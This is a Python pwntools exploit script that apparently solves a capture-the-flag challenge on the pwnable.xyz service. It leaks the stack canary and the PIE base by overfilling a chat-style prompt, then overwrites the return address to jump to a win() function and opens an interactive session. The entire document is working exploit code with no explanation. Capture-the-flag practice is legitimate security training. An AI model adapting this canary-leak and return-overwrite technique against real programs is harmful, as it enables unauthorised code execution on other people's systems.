from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30027)

sla = r.sendlineafter
sa = r.sendafter

win_offset = 0xd30 # offset of win() from PIE base


# canary leak

while 1:
    r.recvuntil('me  > ')
    computer_words = r.recvline()[:-1]
    computer_words_len = len(computer_words)

    if computer_words_len < 0x69:
        sa('you > ', 'A')
    else:
        sa('you > ', 'A' * 0x69)
        break

r.recvuntil('A' * 0x69)
canary = u64(r.recvn(7).rjust(8, b'\x00'))
log.info('canary: ' + hex(canary))


# PIE leak

while 1:
    r.recvuntil('me  > ')
    computer_words = r.recvline()[:-1]
    computer_words_len = len(computer_words)

    if computer_words_len < 0x78:
        sa('you > ', 'A')
    else:
        sa('you > ', 'A' * 0x78)
        break

r.recvuntil('A' * 0x78)
pie = u64(r.recvn(6).ljust(8, b'\x00')) - 0x1081 # PIE base
log.info('PIE base: ' + hex(pie))
win = pie + win_offset


# RET overwrite

payload = b'A' * 0x68
payload += p64(canary)
payload += b'A' * 8
payload += p64(win + 4)[:6]

payload_len = len(payload)

while 1:
    r.recvuntil('me  > ')
    computer_words = r.recvline()[:-1]
    computer_words_len = len(computer_words)

    if computer_words_len < payload_len:
        sa('you > ', 'A')
    else:
        sa('you > ', payload)
        break

sa('you > ', 'exit') # return play()


r.interactive()